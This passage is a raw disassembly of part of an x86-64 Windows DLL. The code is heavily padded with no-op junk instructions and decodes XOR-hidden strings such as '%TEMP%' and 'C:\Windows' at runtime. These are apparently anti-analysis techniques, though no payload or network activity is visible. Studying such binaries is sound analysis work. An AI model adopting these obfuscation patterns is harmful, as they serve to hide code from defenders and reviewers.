   180002ba5:	4d 89 ed             	mov    %r13,%r13
   180002ba8:	5d                   	pop    %rbp
   180002ba9:	ff 15 11 35 02 00    	call   *0x23511(%rip)        # 0x1800260c0
   180002baf:	90                   	nop
   180002bb0:	48 83 c4 48          	add    $0x48,%rsp
   180002bb4:	c3                   	ret
   180002bb5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   180002bbc:	00 00 00 00 
   180002bc0:	56                   	push   %rsi
   180002bc1:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   180002bc8:	b9 fa 01 00 00       	mov    $0x1fa,%ecx
   180002bcd:	e8 7e f0 ff ff       	call   0x180001c50
   180002bd2:	53                   	push   %rbx
   180002bd3:	5b                   	pop    %rbx
   180002bd4:	48 8b 35 85 35 02 00 	mov    0x23585(%rip),%rsi        # 0x180026160
   180002bdb:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   180002be0:	ff d6                	call   *%rsi
   180002be2:	90                   	nop
   180002be3:	48 87 d2             	xchg   %rdx,%rdx
   180002be6:	e8 55 e9 ff ff       	call   0x180001540
   180002beb:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   180002bf0:	ff d6                	call   *%rsi
   180002bf2:	ff 15 c8 34 02 00    	call   *0x234c8(%rip)        # 0x1800260c0
   180002bf8:	41 52                	push   %r10
   180002bfa:	48 87 c9             	xchg   %rcx,%rcx
   180002bfd:	41 5a                	pop    %r10
   180002bff:	e8 0c f6 ff ff       	call   0x180002210
   180002c04:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180002c09:	ff 15 f9 35 02 00    	call   *0x235f9(%rip)        # 0x180026208
   180002c0f:	48 8d 12             	lea    (%rdx),%rdx
   180002c12:	4d 8d 1b             	lea    (%r11),%r11
   180002c15:	4d 87 e4             	xchg   %r12,%r12
   180002c18:	48 89 f6             	mov    %rsi,%rsi
   180002c1b:	c7 44 24 20 78 cd 06 	movl   $0x6cd78,0x20(%rsp)
   180002c22:	00 
   180002c23:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002c27:	41 51                	push   %r9
   180002c29:	41 59                	pop    %r9
   180002c2b:	b9 9b 01 00 00       	mov    $0x19b,%ecx
   180002c30:	e8 6b f1 ff ff       	call   0x180001da0
   180002c35:	41 52                	push   %r10
   180002c37:	4d 87 c9             	xchg   %r9,%r9
   180002c3a:	41 5a                	pop    %r10
   180002c3c:	e8 af 00 00 00       	call   0x180002cf0
   180002c41:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002c46:	ff 15 0c 36 02 00    	call   *0x2360c(%rip)        # 0x180026258
   180002c4c:	48 89 d2             	mov    %rdx,%rdx
   180002c4f:	48 8d 0d 30 fc 01 00 	lea    0x1fc30(%rip),%rcx        # 0x180022886
   180002c56:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180002c5b:	ba 04 01 00 00       	mov    $0x104,%edx
   180002c60:	45 31 c9             	xor    %r9d,%r9d
   180002c63:	ff 15 87 34 02 00    	call   *0x23487(%rip)        # 0x1800260f0
   180002c69:	4d 8d 3f             	lea    (%r15),%r15
   180002c6c:	48 87 db             	xchg   %rbx,%rbx
   180002c6f:	48 87 ff             	xchg   %rdi,%rdi
   180002c72:	48 89 d2             	mov    %rdx,%rdx
   180002c75:	90                   	nop
   180002c76:	50                   	push   %rax
   180002c77:	48 89 d2             	mov    %rdx,%rdx
   180002c7a:	58                   	pop    %rax
   180002c7b:	ba 00 10 00 00       	mov    $0x1000,%edx
   180002c80:	31 c9                	xor    %ecx,%ecx
   180002c82:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   180002c88:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180002c8e:	ff 15 1c 36 02 00    	call   *0x2361c(%rip)        # 0x1800262b0
   180002c94:	48 85 c0             	test   %rax,%rax
   180002c97:	74 11                	je     0x180002caa
   180002c99:	48 89 c1             	mov    %rax,%rcx
   180002c9c:	31 d2                	xor    %edx,%edx
   180002c9e:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   180002ca4:	ff 15 0e 36 02 00    	call   *0x2360e(%rip)        # 0x1800262b8
   180002caa:	41 52                	push   %r10
   180002cac:	41 56                	push   %r14
   180002cae:	41 5e                	pop    %r14
   180002cb0:	41 5a                	pop    %r10
   180002cb2:	c7 44 24 20 27 76 58 	movl   $0x587627,0x20(%rsp)
   180002cb9:	00 
   180002cba:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002cbe:	41 56                	push   %r14
   180002cc0:	41 5e                	pop    %r14
   180002cc2:	41 55                	push   %r13
   180002cc4:	53                   	push   %rbx
   180002cc5:	5b                   	pop    %rbx
   180002cc6:	41 5d                	pop    %r13
   180002cc8:	e8 73 e8 ff ff       	call   0x180001540
   180002ccd:	4d 89 c9             	mov    %r9,%r9
   180002cd0:	90                   	nop
   180002cd1:	48 89 f6             	mov    %rsi,%rsi
   180002cd4:	90                   	nop
   180002cd5:	56                   	push   %rsi
   180002cd6:	5e                   	pop    %rsi
   180002cd7:	4d 87 ff             	xchg   %r15,%r15
   180002cda:	4d 87 db             	xchg   %r11,%r11
   180002cdd:	31 c0                	xor    %eax,%eax
   180002cdf:	48 81 c4 30 02 00 00 	add    $0x230,%rsp
   180002ce6:	5e                   	pop    %rsi
   180002ce7:	c3                   	ret
   180002ce8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180002cef:	00 
   180002cf0:	50                   	push   %rax
   180002cf1:	41 51                	push   %r9
   180002cf3:	48 87 f6             	xchg   %rsi,%rsi
   180002cf6:	41 59                	pop    %r9
   180002cf8:	4d 8d 09             	lea    (%r9),%r9
   180002cfb:	48 89 c9             	mov    %rcx,%rcx
   180002cfe:	48 87 d2             	xchg   %rdx,%rdx
   180002d01:	48 8d 00             	lea    (%rax),%rax
   180002d04:	4d 87 f6             	xchg   %r14,%r14
   180002d07:	48 89 e4             	mov    %rsp,%rsp
   180002d0a:	41 54                	push   %r12
   180002d0c:	4d 89 db             	mov    %r11,%r11
   180002d0f:	48 89 f6             	mov    %rsi,%rsi
   180002d12:	41 5c                	pop    %r12
   180002d14:	4d 89 c9             	mov    %r9,%r9
   180002d17:	4d 87 c0             	xchg   %r8,%r8
   180002d1a:	4d 87 ff             	xchg   %r15,%r15
   180002d1d:	90                   	nop
   180002d1e:	57                   	push   %rdi
   180002d1f:	5f                   	pop    %rdi
   180002d20:	51                   	push   %rcx
   180002d21:	59                   	pop    %rcx
   180002d22:	50                   	push   %rax
   180002d23:	48 89 d2             	mov    %rdx,%rdx
   180002d26:	48 89 e4             	mov    %rsp,%rsp
   180002d29:	58                   	pop    %rax
   180002d2a:	90                   	nop
   180002d2b:	48 8d 09             	lea    (%rcx),%rcx
   180002d2e:	90                   	nop
   180002d2f:	c7 44 24 04 8a 02 00 	movl   $0x28a,0x4(%rsp)
   180002d36:	00 
   180002d37:	58                   	pop    %rax
   180002d38:	c3                   	ret
   180002d39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002d40:	56                   	push   %rsi
   180002d41:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   180002d48:	b9 fd 02 00 00       	mov    $0x2fd,%ecx
   180002d4d:	e8 4e f5 ff ff       	call   0x1800022a0
   180002d52:	41 54                	push   %r12
   180002d54:	48 89 ed             	mov    %rbp,%rbp
   180002d57:	4d 89 db             	mov    %r11,%r11
   180002d5a:	41 5c                	pop    %r12
   180002d5c:	ff 15 de 33 02 00    	call   *0x233de(%rip)        # 0x180026140
   180002d62:	48 8d 0d f5 fa 01 00 	lea    0x1faf5(%rip),%rcx        # 0x18002285e
   180002d69:	48 8b 35 b0 33 02 00 	mov    0x233b0(%rip),%rsi        # 0x180026120
   180002d70:	ff d6                	call   *%rsi
   180002d72:	c7 44 24 2c 82 00 00 	movl   $0x82,0x2c(%rsp)
   180002d79:	00 
   180002d7a:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d7e:	35 c1 00 00 00       	xor    $0xc1,%eax
   180002d83:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002d88:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d8c:	35 b8 00 00 00       	xor    $0xb8,%eax
   180002d91:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002d96:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d9a:	35 de 00 00 00       	xor    $0xde,%eax
   180002d9f:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002da4:	66 c7 44 24 36 00 00 	movw   $0x0,0x36(%rsp)
   180002dab:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002db0:	ff 15 12 33 02 00    	call   *0x23312(%rip)        # 0x1800260c8
   180002db6:	90                   	nop
   180002db7:	4d 89 db             	mov    %r11,%r11
   180002dba:	90                   	nop
   180002dbb:	4d 89 d2             	mov    %r10,%r10
   180002dbe:	90                   	nop
   180002dbf:	e8 bc 00 00 00       	call   0x180002e80
   180002dc4:	c7 44 24 30 68 40 4b 	movl   $0x4b4068,0x30(%rsp)
   180002dcb:	00 
   180002dcc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002dd0:	41 51                	push   %r9
   180002dd2:	48 89 ed             	mov    %rbp,%rbp
   180002dd5:	41 59                	pop    %r9
   180002dd7:	e8 54 e4 ff ff       	call   0x180001230
   180002ddc:	55                   	push   %rbp
   180002ddd:	4d 87 f6             	xchg   %r14,%r14
   180002de0:	5d                   	pop    %rbp
   180002de1:	41 54                	push   %r12
   180002de3:	51                   	push   %rcx
   180002de4:	59                   	pop    %rcx
   180002de5:	41 5c                	pop    %r12
   180002de7:	41 51                	push   %r9
   180002de9:	48 8d 36             	lea    (%rsi),%rsi
   180002dec:	4d 8d 3f             	lea    (%r15),%r15
   180002def:	41 59                	pop    %r9
   180002df1:	b9 6f 02 00 00       	mov    $0x26f,%ecx
   180002df6:	e8 c5 ec ff ff       	call   0x180001ac0
   180002dfb:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180002e00:	b9 04 01 00 00       	mov    $0x104,%ecx
   180002e05:	ff 15 95 32 02 00    	call   *0x23295(%rip)        # 0x1800260a0
   180002e0b:	48 87 c9             	xchg   %rcx,%rcx
   180002e0e:	4d 87 d2             	xchg   %r10,%r10
   180002e11:	48 89 d2             	mov    %rdx,%rdx
   180002e14:	e8 27 e7 ff ff       	call   0x180001540
   180002e19:	41 54                	push   %r12
   180002e1b:	90                   	nop
   180002e1c:	41 5c                	pop    %r12
   180002e1e:	48 8d 0d 43 fa 01 00 	lea    0x1fa43(%rip),%rcx        # 0x180022868
   180002e25:	ff d6                	call   *%rsi
   180002e27:	41 56                	push   %r14
   180002e29:	4d 87 c0             	xchg   %r8,%r8
   180002e2c:	41 5e                	pop    %r14
   180002e2e:	e8 4d e2 ff ff       	call   0x180001080
   180002e33:	ff 15 6f 32 02 00    	call   *0x2326f(%rip)        # 0x1800260a8
   180002e39:	48 8d 36             	lea    (%rsi),%rsi
   180002e3c:	48 89 ff             	mov    %rdi,%rdi
   180002e3f:	50                   	push   %rax
   180002e40:	4d 8d 09             	lea    (%r9),%r9
   180002e43:	48 87 c9             	xchg   %rcx,%rcx
   180002e46:	58                   	pop    %rax
   180002e47:	c7 44 24 30 38 cf ec 	movl   $0xeccf38,0x30(%rsp)
   180002e4e:	00 
   180002e4f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002e53:	56                   	push   %rsi
   180002e54:	5e                   	pop    %rsi
   180002e55:	90                   	nop
   180002e56:	48 87 ff             	xchg   %rdi,%rdi
   180002e59:	41 55                	push   %r13
   180002e5b:	41 5d                	pop    %r13
   180002e5d:	57                   	push   %rdi
   180002e5e:	41 52                	push   %r10
   180002e60:	41 5a                	pop    %r10
   180002e62:	5f                   	pop    %rdi
   180002e63:	b8 01 00 00 00       	mov    $0x1,%eax
   180002e68:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   180002e6f:	5e                   	pop    %rsi
   180002e70:	c3                   	ret
   180002e71:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180002e78:	0f 1f 84 00 00 00 00 
   180002e7f:	00 
   180002e80:	50                   	push   %rax
   180002e81:	41 50                	push   %r8
   180002e83:	4d 89 f6             	mov    %r14,%r14
   180002e86:	41 58                	pop    %r8
   180002e88:	48 87 e4             	xchg   %rsp,%rsp
   180002e8b:	4d 89 d2             	mov    %r10,%r10
   180002e8e:	48 89 d2             	mov    %rdx,%rdx
   180002e91:	90                   	nop
   180002e92:	90                   	nop
   180002e93:	4d 8d 3f             	lea    (%r15),%r15
   180002e96:	90                   	nop
   180002e97:	4d 89 db             	mov    %r11,%r11
   180002e9a:	90                   	nop
   180002e9b:	41 56                	push   %r14
   180002e9d:	41 5e                	pop    %r14
   180002e9f:	90                   	nop
   180002ea0:	90                   	nop
   180002ea1:	90                   	nop
   180002ea2:	48 89 db             	mov    %rbx,%rbx
   180002ea5:	4d 87 c9             	xchg   %r9,%r9
   180002ea8:	57                   	push   %rdi
   180002ea9:	48 8d 3f             	lea    (%rdi),%rdi
   180002eac:	5f                   	pop    %rdi
   180002ead:	51                   	push   %rcx
   180002eae:	59                   	pop    %rcx
   180002eaf:	52                   	push   %rdx
   180002eb0:	4d 87 d2             	xchg   %r10,%r10
   180002eb3:	5a                   	pop    %rdx
   180002eb4:	41 53                	push   %r11
   180002eb6:	48 87 e4             	xchg   %rsp,%rsp
   180002eb9:	41 5b                	pop    %r11
   180002ebb:	90                   	nop
   180002ebc:	48 87 e4             	xchg   %rsp,%rsp
   180002ebf:	c7 44 24 04 f3 01 00 	movl   $0x1f3,0x4(%rsp)
   180002ec6:	00 
   180002ec7:	58                   	pop    %rax
   180002ec8:	c3                   	ret
   180002ec9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002ed0:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
   180002ed7:	b9 bf 01 00 00       	mov    $0x1bf,%ecx
   180002edc:	e8 df ea ff ff       	call   0x1800019c0
   180002ee1:	41 53                	push   %r11
   180002ee3:	4d 89 f6             	mov    %r14,%r14
   180002ee6:	48 8d 1b             	lea    (%rbx),%rbx
   180002ee9:	41 5b                	pop    %r11
   180002eeb:	52                   	push   %rdx
   180002eec:	90                   	nop
   180002eed:	5a                   	pop    %rdx
   180002eee:	ff 15 dc 31 02 00    	call   *0x231dc(%rip)        # 0x1800260d0
   180002ef4:	48 85 c0             	test   %rax,%rax
   180002ef7:	74 09                	je     0x180002f02
   180002ef9:	48 89 c1             	mov    %rax,%rcx
   180002efc:	ff 15 5e 31 02 00    	call   *0x2315e(%rip)        # 0x180026060
   180002f02:	48 8d 12             	lea    (%rdx),%rdx
   180002f05:	4d 8d 1b             	lea    (%r11),%r11
   180002f08:	ff 15 ea 31 02 00    	call   *0x231ea(%rip)        # 0x1800260f8
   180002f0e:	89 c1                	mov    %eax,%ecx
   180002f10:	ff 15 5a 33 02 00    	call   *0x2335a(%rip)        # 0x180026270
   180002f16:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002f1b:	ba 04 01 00 00       	mov    $0x104,%edx
   180002f20:	ff 15 92 32 02 00    	call   *0x23292(%rip)        # 0x1800261b8
   180002f26:	48 87 c9             	xchg   %rcx,%rcx
   180002f29:	4d 89 ff             	mov    %r15,%r15
   180002f2c:	90                   	nop
   180002f2d:	e8 0e e6 ff ff       	call   0x180001540
   180002f32:	c7 44 24 20 67 cd 3d 	movl   $0x3dcd67,0x20(%rsp)
   180002f39:	00 
   180002f3a:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002f3e:	48 8d 3f             	lea    (%rdi),%rdi
   180002f41:	48 8d 09             	lea    (%rcx),%rcx
   180002f44:	48 8d 3f             	lea    (%rdi),%rdi
   180002f47:	90                   	nop
   180002f48:	48 89 db             	mov    %rbx,%rbx
   180002f4b:	4d 8d 3f             	lea    (%r15),%r15
   180002f4e:	e8 ed f4 ff ff       	call   0x180002440
   180002f53:	4d 8d 12             	lea    (%r10),%r10
   180002f56:	41 55                	push   %r13
   180002f58:	48 87 ed             	xchg   %rbp,%rbp
   180002f5b:	41 5d                	pop    %r13
   180002f5d:	41 54                	push   %r12
   180002f5f:	41 5c                	pop    %r12
   180002f61:	48 b8 43 00 3a 00 5c 	movabs $0x5c003a0043,%rax
   180002f68:	00 00 00 
   180002f6b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002f70:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002f75:	ff 15 4d 31 02 00    	call   *0x2314d(%rip)        # 0x1800260c8
   180002f7b:	90                   	nop
   180002f7c:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
   180002f83:	c3                   	ret
   180002f84:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   180002f8b:	00 00 00 00 00 
   180002f90:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   180002f97:	c7 44 24 3c 3f 00 00 	movl   $0x3f,0x3c(%rsp)
   180002f9e:	00 
   180002f9f:	4d 89 c0             	mov    %r8,%r8
   180002fa2:	48 87 db             	xchg   %rbx,%rbx
   180002fa5:	48 89 c0             	mov    %rax,%rax
   180002fa8:	48 87 ed             	xchg   %rbp,%rbp
   180002fab:	e8 50 ee ff ff       	call   0x180001e00
   180002fb0:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180002fb4:	41 53                	push   %r11
   180002fb6:	41 54                	push   %r12
   180002fb8:	41 5c                	pop    %r12
   180002fba:	41 5b                	pop    %r11
   180002fbc:	b9 50 02 00 00       	mov    $0x250,%ecx
   180002fc1:	e8 1a f0 ff ff       	call   0x180001fe0
   180002fc6:	57                   	push   %rdi
   180002fc7:	5f                   	pop    %rdi
   180002fc8:	ff 15 ba 30 02 00    	call   *0x230ba(%rip)        # 0x180026088
   180002fce:	c7 44 24 28 bc 00 00 	movl   $0xbc,0x28(%rsp)
   180002fd5:	00 
   180002fd6:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180002fda:	35 99 00 00 00       	xor    $0x99,%eax
   180002fdf:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   180002fe4:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180002fe8:	35 e8 00 00 00       	xor    $0xe8,%eax
   180002fed:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002ff2:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180002ff6:	35 f9 00 00 00       	xor    $0xf9,%eax
   180002ffb:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180003000:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003004:	35 f1 00 00 00       	xor    $0xf1,%eax
   180003009:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   18000300e:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003012:	35 ec 00 00 00       	xor    $0xec,%eax
   180003017:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   18000301c:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003020:	35 99 00 00 00       	xor    $0x99,%eax
   180003025:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   18000302a:	66 c7 44 24 3a 00 00 	movw   $0x0,0x3a(%rsp)
   180003031:	48 8d 4c 24 2e       	lea    0x2e(%rsp),%rcx
   180003036:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000303b:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003041:	ff 15 d1 2f 02 00    	call   *0x22fd1(%rip)        # 0x180026018
   180003047:	51                   	push   %rcx
   180003048:	4d 8d 1b             	lea    (%r11),%r11
   18000304b:	4d 89 ff             	mov    %r15,%r15
   18000304e:	59                   	pop    %rcx
   18000304f:	c7 44 24 40 ee 65 67 	movl   $0x6765ee,0x40(%rsp)
   180003056:	00 
   180003057:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000305b:	48 89 db             	mov    %rbx,%rbx
   18000305e:	41 54                	push   %r12
   180003060:	48 87 f6             	xchg   %rsi,%rsi
   180003063:	41 5c                	pop    %r12
   180003065:	41 56                	push   %r14
   180003067:	41 5e                	pop    %r14
   180003069:	48 87 d2             	xchg   %rdx,%rdx
   18000306c:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180003070:	31 c0                	xor    %eax,%eax
   180003072:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   180003079:	c3                   	ret
   18000307a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003080:	56                   	push   %rsi
   180003081:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   180003088:	b9 06 02 00 00       	mov    $0x206,%ecx
   18000308d:	e8 5e e4 ff ff       	call   0x1800014f0
   180003092:	4d 87 ed             	xchg   %r13,%r13
   180003095:	ff 15 15 31 02 00    	call   *0x23115(%rip)        # 0x1800261b0
   18000309b:	48 89 f6             	mov    %rsi,%rsi
   18000309e:	90                   	nop
   18000309f:	41 54                	push   %r12
   1800030a1:	41 5c                	pop    %r12
   1800030a3:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1800030a8:	ff 15 b2 30 02 00    	call   *0x230b2(%rip)        # 0x180026160
   1800030ae:	48 89 c1             	mov    %rax,%rcx
   1800030b1:	ff 15 31 30 02 00    	call   *0x23031(%rip)        # 0x1800260e8
   1800030b7:	c7 44 24 50 50 d3 13 	movl   $0x13d350,0x50(%rsp)
   1800030be:	00 
   1800030bf:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800030c3:	48 87 ff             	xchg   %rdi,%rdi
   1800030c6:	e8 35 ed ff ff       	call   0x180001e00
   1800030cb:	41 50                	push   %r8
   1800030cd:	41 58                	pop    %r8
   1800030cf:	41 53                	push   %r11
   1800030d1:	4d 87 ed             	xchg   %r13,%r13
   1800030d4:	41 5b                	pop    %r11
   1800030d6:	e8 95 eb ff ff       	call   0x180001c70
   1800030db:	b9 fe 02 00 00       	mov    $0x2fe,%ecx
   1800030e0:	e8 6b f1 ff ff       	call   0x180002250
   1800030e5:	41 53                	push   %r11
   1800030e7:	41 5b                	pop    %r11
   1800030e9:	e8 22 ea ff ff       	call   0x180001b10
   1800030ee:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1800030f3:	ff 15 17 31 02 00    	call   *0x23117(%rip)        # 0x180026210
   1800030f9:	c7 44 24 2c a9 00 00 	movl   $0xa9,0x2c(%rsp)
   180003100:	00 
   180003101:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003105:	35 ea 00 00 00       	xor    $0xea,%eax
   18000310a:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   18000310f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003113:	35 93 00 00 00       	xor    $0x93,%eax
   180003118:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   18000311d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003121:	35 f5 00 00 00       	xor    $0xf5,%eax
   180003126:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   18000312b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000312f:	35 fe 00 00 00       	xor    $0xfe,%eax
   180003134:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180003139:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000313d:	35 c0 00 00 00       	xor    $0xc0,%eax
   180003142:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180003147:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000314b:	35 c7 00 00 00       	xor    $0xc7,%eax
   180003150:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180003155:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003159:	35 cd 00 00 00       	xor    $0xcd,%eax
   18000315e:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180003163:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003167:	35 c6 00 00 00       	xor    $0xc6,%eax
   18000316c:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180003171:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003175:	35 de 00 00 00       	xor    $0xde,%eax
   18000317a:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   18000317f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003183:	35 da 00 00 00       	xor    $0xda,%eax
   180003188:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   18000318d:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   180003194:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003199:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000319e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800031a4:	ff 15 66 2f 02 00    	call   *0x22f66(%rip)        # 0x180026110
   1800031aa:	53                   	push   %rbx
   1800031ab:	41 53                	push   %r11
   1800031ad:	41 5b                	pop    %r11
   1800031af:	5b                   	pop    %rbx
   1800031b0:	41 50                	push   %r8
   1800031b2:	48 8d 09             	lea    (%rcx),%rcx
   1800031b5:	41 58                	pop    %r8
   1800031b7:	ff 15 db 2f 02 00    	call   *0x22fdb(%rip)        # 0x180026198
   1800031bd:	89 c6                	mov    %eax,%esi
   1800031bf:	ff 15 eb 2e 02 00    	call   *0x22eeb(%rip)        # 0x1800260b0
   1800031c5:	0f af c6             	imul   %esi,%eax
   1800031c8:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1800031cc:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800031d0:	90                   	nop
   1800031d1:	4d 8d 1b             	lea    (%r11),%r11
   1800031d4:	c7 44 24 2c 6f 00 00 	movl   $0x6f,0x2c(%rsp)
   1800031db:	00 
   1800031dc:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800031e0:	83 f0 38             	xor    $0x38,%eax
   1800031e3:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   1800031e8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800031ec:	83 f0 26             	xor    $0x26,%eax
   1800031ef:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   1800031f4:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800031f8:	83 f0 21             	xor    $0x21,%eax
   1800031fb:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180003200:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003204:	83 f0 2b             	xor    $0x2b,%eax
   180003207:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   18000320c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003210:	83 f0 26             	xor    $0x26,%eax
   180003213:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180003218:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000321c:	83 f0 3d             	xor    $0x3d,%eax
   18000321f:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180003224:	66 c7 44 24 3c 00 00 	movw   $0x0,0x3c(%rsp)
   18000322b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003230:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003235:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000323b:	ff 15 97 2e 02 00    	call   *0x22e97(%rip)        # 0x1800260d8
   180003241:	48 8d 00             	lea    (%rax),%rax
   180003244:	48 89 e4             	mov    %rsp,%rsp
   180003247:	48 87 c9             	xchg   %rcx,%rcx
   18000324a:	4d 87 c0             	xchg   %r8,%r8
   18000324d:	c7 44 24 50 f6 42 06 	movl   $0x642f6,0x50(%rsp)
   180003254:	00 
   180003255:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003259:	48 87 ff             	xchg   %rdi,%rdi
   18000325c:	48 89 e4             	mov    %rsp,%rsp
   18000325f:	41 50                	push   %r8
   180003261:	90                   	nop
   180003262:	41 58                	pop    %r8
   180003264:	48 87 ed             	xchg   %rbp,%rbp
   180003267:	4d 8d 36             	lea    (%r14),%r14
   18000326a:	4d 87 ff             	xchg   %r15,%r15
   18000326d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003272:	ff 15 e0 2f 02 00    	call   *0x22fe0(%rip)        # 0x180026258
   180003278:	0f b6 44 24 50       	movzbl 0x50(%rsp),%eax
   18000327d:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   180003284:	5e                   	pop    %rsi
   180003285:	c3                   	ret
   180003286:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   18000328d:	00 00 00 
   180003290:	56                   	push   %rsi
   180003291:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   180003298:	c7 44 24 5c 18 00 00 	movl   $0x18,0x5c(%rsp)
   18000329f:	00 
   1800032a0:	e8 8b e3 ff ff       	call   0x180001630
   1800032a5:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   1800032a9:	4d 8d 09             	lea    (%r9),%r9
   1800032ac:	4d 89 e4             	mov    %r12,%r12
   1800032af:	41 50                	push   %r8
   1800032b1:	48 8d 09             	lea    (%rcx),%rcx
   1800032b4:	4d 87 f6             	xchg   %r14,%r14
   1800032b7:	41 58                	pop    %r8
   1800032b9:	b9 e5 02 00 00       	mov    $0x2e5,%ecx
   1800032be:	e8 fd e7 ff ff       	call   0x180001ac0
   1800032c3:	4d 8d 00             	lea    (%r8),%r8
   1800032c6:	4d 87 f6             	xchg   %r14,%r14
   1800032c9:	4d 8d 3f             	lea    (%r15),%r15
   1800032cc:	c7 44 24 4c 38 00 00 	movl   $0x38,0x4c(%rsp)
   1800032d3:	00 
   1800032d4:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
